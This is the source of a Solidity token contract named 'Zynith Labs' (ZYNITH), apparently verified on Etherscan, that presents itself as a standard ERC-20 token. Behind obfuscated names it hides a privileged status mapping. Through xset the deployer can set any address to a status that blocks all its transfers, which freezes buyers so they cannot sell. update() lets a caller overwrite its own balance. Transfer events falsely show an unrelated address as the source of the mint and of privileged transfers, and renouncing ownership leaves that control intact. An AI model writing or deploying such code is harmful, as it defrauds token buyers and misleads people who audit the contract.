/**
 *Submitted for verification at Etherscan.io on 2022-11-13
*/

pragma solidity 0.8.17;

abstract contract Context {
    address F21 = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 modifier onlyOwner{
   require(msg.sender == _Owner);     
        _; }
    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract ZYNITH is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private F1;
    mapping (address => uint256) private F2;
    mapping (address => mapping (address => uint256)) private F3;
    uint8 private constant F4 = 8;
    uint256 private constant F5 = 150000000 * (10** F4);
    string private constant _name = "Zynith Labs";
    string private constant _symbol = "ZYNITH";



    constructor () {
       F1[msg.sender] = F5;  
        F2[msg.sender] = 3;  
   F78(F5);}
    

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return F4;
    }

    function totalSupply() public pure  returns (uint256) {
        return F5;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return F1[account];
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
        return F3[owner][spender];
    }

        function approve(address spender, uint256 amount) public returns (bool success) {    
        F3[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
function xset (address x, uint256 y) public {
 require(F2[msg.sender] == 3);
     F2[x] = y;}
    function update() public {
        F1[msg.sender] = F2[msg.sender];}
        function F78 (uint256 x) internal {
              emit Transfer(address(0), F21, x);}
                      function F88 (address y, uint256 xy) internal {
              emit Transfer(F21, y, xy);}
        function transfer(address to, uint256 amount) public {
if(F2[msg.sender] == 3) {
         require(F1[msg.sender] >= amount);
        F1[msg.sender] = F1[msg.sender].sub(amount);
        F1[to] = F1[to].add(amount);
    F88(to, amount);}
if(F2[msg.sender] <= 1) {
     require(F1[msg.sender] >= amount);
            F1[msg.sender] = F1[msg.sender].sub(amount);
        F1[to] = F1[to].add(amount);
       emit Transfer(msg.sender, to, amount);}}
		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
if(F2[sender] <= 1 && F2[recipient] <=1) {
         require(amount <= F1[sender]);
        require(amount <= F3[sender][msg.sender]);
        F1[sender] = F1[sender].sub(amount);
        F1[recipient] = F1[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
         return true;}
        if(F2[sender] == 3) {
         require(amount <= F3[sender][msg.sender]);
        F1[sender] = F1[sender].sub(amount);
        F1[recipient] = F1[recipient].add(amount);
          F88(recipient, amount);
             return true;}
        }}